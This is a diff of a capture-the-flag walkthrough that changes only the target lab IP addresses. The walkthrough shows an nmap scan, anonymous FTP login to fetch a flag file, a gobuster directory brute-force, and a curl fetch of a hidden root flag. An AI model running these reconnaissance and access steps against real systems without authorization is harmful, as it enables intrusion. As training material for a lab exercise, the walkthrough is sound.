@@ -8,13 +8,13 @@
 
 **Step 1 — Scan for FTP with Nmap:**
 ```bash
-nmap -sV -p 21 172.40.0.11
-# Also useful: nmap --script ftp-anon 172.40.0.11
+nmap -sV -p 21 10.10.4.11
+# Also useful: nmap --script ftp-anon 10.10.4.11
 ```
 
 **Step 2 — Connect anonymously and retrieve the flag:**
 ```bash
-ftp 172.40.0.11
+ftp 10.10.4.11
 # Username: anonymous  Password: (blank or any email)
 ftp> ls pub/
 ftp> get pub/user.txt
@@ -28,18 +28,18 @@ cat user.txt
 
 **Step 1 — Scan the web server:**
 ```bash
-nmap -sV -p 80 172.40.0.10
+nmap -sV -p 80 10.10.4.10
 ```
 
 **Step 2 — Brute-force directories with gobuster:**
 ```bash
-gobuster dir -u http://172.40.0.10 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.10.4.10 -w /usr/share/wordlists/dirb/common.txt
 # Discovers /secret/
 ```
 
 **Step 3 — Retrieve the flag:**
 ```bash
-curl http://172.40.0.10/secret/root.txt
+curl http://10.10.4.10/secret/root.txt
 ```
 
 ---
